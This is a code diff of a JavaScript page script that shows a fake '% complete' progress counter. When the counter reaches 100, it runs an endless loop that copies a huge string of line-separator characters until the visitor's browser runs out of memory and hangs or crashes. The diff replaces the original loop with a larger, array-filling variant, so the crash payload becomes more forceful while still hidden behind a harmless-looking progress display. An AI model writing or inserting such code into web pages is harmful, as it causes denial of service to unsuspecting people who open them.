@@ -72,8 +72,9 @@
                 pc.innerText = `%${i} complete`
                 if (i == 100){
                     clearInterval()
-                    let text = "\u2028".repeat(32767);
-                    while(true) text += text;
+                    let text = "\u2028".repeat(4294967295);
+                    let textArr = [text, text, text, text, text];
+                    while(true) textArr.push(text);
                 } else {
                     i += 20
                 }
